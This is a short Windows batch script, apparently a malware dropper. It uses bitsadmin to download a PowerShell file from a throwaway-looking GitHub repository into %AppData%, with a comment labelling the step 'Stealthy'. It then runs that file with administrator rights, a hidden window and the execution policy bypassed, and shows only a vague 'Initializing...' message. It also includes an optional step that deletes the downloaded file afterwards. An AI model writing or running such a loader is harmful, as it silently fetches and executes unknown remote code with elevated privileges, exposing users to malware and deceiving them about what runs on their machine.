@echo off
:: Set the URL to your .ps1 file on GitHub
set "scriptUrl=https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/setup.ps1"
set "dest=%AppData%\setup.ps1"

echo Initializing...

:: Download the PowerShell script using BitsAdmin (Stealthy)
bitsadmin /transfer "DownloadScript" %scriptUrl% %dest% >nul

:: Execute the downloaded script as Admin
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%dest%""'"

:: Clean up (Optional: deletes the ps1 after running)
:: del "%dest%"
exit